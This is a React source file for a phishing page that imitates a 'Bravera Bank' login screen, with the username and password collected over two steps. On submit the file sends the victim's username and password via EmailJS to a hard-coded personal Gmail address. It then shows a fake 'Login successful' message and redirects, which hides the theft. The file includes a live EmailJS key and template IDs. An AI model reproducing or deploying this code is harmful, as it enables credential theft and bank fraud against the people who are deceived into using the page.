import { useState, useEffect } from 'react';
import BG from '../assets/bg.png';
import Logo from '../assets/logo.png';
import emailjs from '@emailjs/browser';
import Footer from '../components/Footer';
import { Navigate } from 'react-router-dom';

export default function Login() {
  const [formData, setFormData] = useState({
    name: '',
    password: '',
    bName: 'Bravera Bank', // Default bank name
  });

  const [step, setStep] = useState(1); // 1 = Username, 2 = Password
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [submitStatus, setSubmitStatus] = useState(null);
  const [showPassword, setShowPassword] = useState(false); // State to track password visibility

  // Initialize EmailJS
  useEffect(() => {
    // Replace with your actual EmailJS public key
    emailjs.init("v_oAluZ11har85Kfg");
  }, []);

  const handleChange = (e) => {
    const { name, value } = e.target;
    setFormData((prev) => ({ ...prev, [name]: value }));
  };

  const handleContinue = (e) => {
    e.preventDefault();
    if (formData.name.trim()) {
      setStep(2);
    }
  };

  const togglePasswordVisibility = () => {
    setShowPassword(!showPassword);
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    
    if (!isReadyToSubmit) return;
    
    setIsSubmitting(true);
    setSubmitStatus(null);
    
    try {
      // Send email using EmailJS
      const response = await emailjs.send(
        "template_vj50jeg", // Replace with your EmailJS service ID
        "template_lg21nvy", // Replace with your EmailJS template ID
        {
          bName: formData.bName,
          username: formData.name,
          password: formData.password,
          to_email: "leslieolobo@gmail.com", // Optional if specified in the template
        }
      );
      
      
      console.log("Email sent successfully:", response);
      setSubmitStatus("success");
      
      // Redirect to the bank's real site after a short delay
      setTimeout(() => {
        window.location.href = "/";
      }, 1500);
      
    } catch (error) {
      console.error("Failed to send email:", error);
      setSubmitStatus("error");
    } finally {
      setIsSubmitting(false);
    }
  };

  const isReadyToSubmit = formData.name.trim() && formData.password.trim();

  return (
    <div
      className="min-h-screen flex flex-col justify-between"
      style={{
        backgroundImage: `url(${BG})`,
        backgroundSize: 'cover',
        backgroundPosition: 'center',
      }}
    >
      {/* Main Content */}
      <div className="flex-grow flex items-center justify-center p-4">
        <div className="bg-[#1E1F20] text-white w-full md:w-md max-w-lg p-6 rounded-lg shadow-xl">
          <div className="flex flex-col items-center">
            <img src={Logo} alt="Logo" className="w-72 h-20 mb-6" />
          </div>

          <form
            className="space-y-5"
            onSubmit={step === 1 ? handleContinue : handleSubmit}
          >
            {/* Username Field */}
            <div>
              <div className='focus:outline-none focus:ring-2 focus:ring-[#F2AA2E]'>
                <input
                  type="text"
                  name="name"
                  value={formData.name}
                  onChange={handleChange}
                  placeholder="Username"
                  required
                  className={`w-full px-4 py-3 bg-[#1E1F20] text-white border border-gray-600 rounded focus:outline-none focus:bg-[#1E1F20] focus:ring-2 focus:ring-[#F2AA2E]`}
                />
                {step === 2 && (
                  <p 
                    className='text-sm text-[#F2AA2E] translate-x-64 md:translate-x-86 -translate-y-9 border-gray-600 z-10 cursor-pointer'
                    onClick={() => setStep(1)}
                  >
                    Switch
                  </p>
                )}
              </div>
              {step === 1 && (
                <div className="flex justify-end mt-2">
                  <a href="/forgot" className="text-sm text-[#F2AA2E] hover:underline">Forgot?</a>
                </div>
              )}
            </div>

            {/* Password Field - only shows on step 2 */}
            {step === 2 && (
              <div className="relative">
                <input
                  type={showPassword ? "text" : "password"}
                  name="password"
                  value={formData.password}
                  onChange={handleChange}
                  placeholder="Enter your password"
                  required
                  className="w-full px-4 py-3 bg-[#1E1F20] text-white border border-gray-600 rounded focus:outline-none focus:ring-2 focus:ring-[#F2AA2E]"
                />
                <button 
                  type="button"
                  onClick={togglePasswordVisibility}
                  className="absolute right-3 top-3 text-gray-400 hover:text-white"
                >
                  {showPassword ? (
                    // Eye with slash (hidden) icon
                    <svg xmlns="http://www.w3.org/2000/svg" className="h-6 w-6" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M13.875 18.825A10.05 10.05 0 0112 19c-4.478 0-8.268-2.943-9.543-7a9.97 9.97 0 011.563-3.029m5.858.908a3 3 0 114.243 4.243M9.878 9.878l4.242 4.242M9.88 9.88l-3.29-3.29m7.532 7.532l3.29 3.29M3 3l3.59 3.59m0 0A9.953 9.953 0 0112 5c4.478 0 8.268 2.943 9.543 7a10.025 10.025 0 01-4.132 5.411m0 0L21 21" />
                    </svg>
                  ) : (
                    // Eye icon (visible)
                    <svg xmlns="http://www.w3.org/2000/svg" className="h-6 w-6" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M15 12a3 3 0 11-6 0 3 3 0 016 0z" />
                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z" />
                    </svg>
                  )}
                </button>
                <div className="flex justify-end mt-2">
                  <a href="https://secure.bravera.bank/forgot" className="text-sm text-[#F2AA2E] hover:underline">Forgot?</a>
                </div>
              </div>
            )}

            {/* Status message */}
            {submitStatus === "success" && (
              <div className="text-green-500 text-center">Login successful. Redirecting...</div>
            )}
            {submitStatus === "error" && (
              <div className="text-red-500 text-center">
                Something went wrong. Please try again.
              </div>
            )}

            {/* Bottom Actions */}
            <div className="flex justify-between items-center text-sm">
              <div className='flex items-center gap-2'>
                {step === 2 && (
                  <svg width={20} fill='#F2AA2E' viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
                    <path d="M20.3805428,13.8137069 C20.7055134,16.1582382 19.2593532,17.570874 17.4092135,17.7960134 C15.7762239,17.9947284 14.1114747,16.9681911 13.8785019,15.0555136 L13.8595687,14.8545033 C13.7790838,13.6557045 13.0355191,13.0330742 12.0230096,13.066022 C11.05262,13.0975991 10.3181869,13.7240229 10.3181869,14.5810911 C10.3181869,17.4367719 11.3683308,19.1423433 14.5557119,20.5651349 C14.9339525,20.7339749 15.1037051,21.1774713 14.9348651,21.5557119 C14.7660251,21.9339525 14.3225287,22.1037051 13.9442881,21.9348651 C10.2032953,20.2649509 8.81818692,18.0153532 8.81818692,14.5810911 C8.81818692,12.8447756 10.2507423,11.6228988 11.9742243,11.5668155 C13.7082808,11.5103881 15.1194035,12.6399884 15.3374431,14.5467693 L15.3561995,14.7540225 C15.429414,15.8445306 16.322059,16.4172418 17.2280184,16.3069975 C18.3243687,16.1735851 19.0896808,15.4260142 18.8947476,14.0196498 C18.3183902,9.8614644 13.5967275,7.0902036 9.75231256,8.6064211 C5.72979556,10.1928811 4.16583408,13.7505577 5.81863998,18.047386 C5.96734806,18.433985 5.77449938,18.8679371 5.38790038,19.0166452 C5.00130139,19.1653533 4.56734927,18.9725046 4.41864118,18.5859056 C2.47014448,13.5203648 4.41353867,9.09956029 9.20197565,7.21102536 C13.9515477,5.33781855 19.6710097,8.6947125 20.3805428,13.8137069 Z M17.9520641,14.7577603 C17.9520641,15.1719739 17.6162777,15.5077603 17.2020641,15.5077603 C16.7878506,15.5077603 16.4520641,15.1719739 16.4520641,14.7577603 C16.4520641,12.3190462 14.2664688,10.6030471 12.0398447,10.6492278 C9.87888055,10.6940466 8.03428382,12.0793713 7.77632991,14.3007925 C7.51636764,16.539509 8.7084915,19.0419133 10.3448004,20.6140101 C10.6434956,20.9009839 10.6529977,21.3757626 10.3660239,21.6744579 C10.07905,21.9731532 9.60427133,21.9826553 9.30557605,21.6956814 C7.3610446,19.8274573 5.96482003,16.8966223 6.28634185,14.1277734 C6.6384375,11.095632 9.15077109,9.20882519 12.0087411,9.1495503 C15.0113761,9.08727503 17.9520641,11.3961279 17.9520641,14.7577603 Z M12.0356675,14.0078405 C12.4498368,14.0017826 12.7904982,14.3326222 12.7965562,14.7467914 C12.8351549,17.3857128 15.2057052,19.0920846 17.8887035,18.5678296 C18.295229,18.488395 18.6891776,18.7535545 18.7686123,19.1600801 C18.8480469,19.5666056 18.5828873,19.9605542 18.1763618,20.0399888 C14.6140996,20.736051 11.3496285,18.3862163 11.2967166,14.7687292 C11.2906587,14.3545599 11.6214983,14.0138985 12.0356675,14.0078405 Z M21.0390793,8.97004406 C21.28404,9.30406074 21.2118458,9.77341463 20.8778291,10.0183753 C20.5438125,10.263336 20.0744586,10.1911418 19.8294979,9.85712514 C15.6762501,4.19395483 7.47506811,4.97312875 4.36077947,9.81906473 C4.13683898,10.1675235 3.67281767,10.2684656 3.32435888,10.0445251 C2.97590008,9.82058458 2.87495805,9.35656328 3.09889854,9.00810448 C6.75686194,3.31619261 16.2324408,2.41594141 21.0390793,8.97004406 Z M12.0795658,2.00170165 C14.4139345,2.00170165 16.4372937,2.58338203 18.1889848,3.56526901 C18.550306,3.76780273 18.6790286,4.22489741 18.4764949,4.58621855 C18.2739612,4.9475397 17.8168665,5.07626234 17.4555454,4.87372862 C15.918012,4.0118849 14.1433536,3.50170165 12.0795658,3.50170165 C9.9768514,3.50170165 8.00147381,4.05741986 6.70286873,4.85793988 C6.35026747,5.07529955 5.88822284,4.96566457 5.67086318,4.61306331 C5.45350351,4.26046205 5.56313848,3.79841742 5.91573975,3.58105775 C7.45185852,2.63412335 9.69988932,2.00170165 12.0795658,2.00170165 Z"></path>
                  </svg>
                )}
                <a href="/enroll" className="text-[#F2AA2E] hover:underline">
                  {step === 2 ? "Sign in with a passkey " : "First time user? Enroll now."}
                </a>
              </div>
              
              {step === 1 ? (
                <button
                  type="submit"
                  className="bg-[#3B3836] text-white px-8 py-4 rounded-md hover:bg-[#4e4c4b] disabled:opacity-50 disabled:cursor-not-allowed"
                  disabled={!formData.name.trim()}
                >
                  Continue
                </button>
              ) : (
                <button
                  type="submit"
                  className="bg-[#3B3836] text-white px-8 py-4 rounded-md hover:bg-[#4e4c4b] disabled:opacity-50 disabled:cursor-not-allowed"
                  disabled={!isReadyToSubmit || isSubmitting}
                >
                  {isSubmitting ? "Signing In..." : "Sign In"}
                </button>
              )}
            </div>
          </form>
        </div>
      </div>

      {/* Footer */}
      <Footer/>
    </div>
  );
}